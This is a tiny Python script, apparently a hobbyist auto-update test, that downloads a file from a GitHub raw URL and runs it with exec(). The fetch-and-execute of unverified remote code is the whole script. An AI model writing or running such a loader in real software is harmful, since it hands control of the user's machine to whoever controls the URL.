import requests

url = "https://raw.githubusercontent.com/justatestkd/testpyautoupdatelol/main/test.py"

def GetCode():
	page = requests.get(url)
	return page.text
	
exec(GetCode())
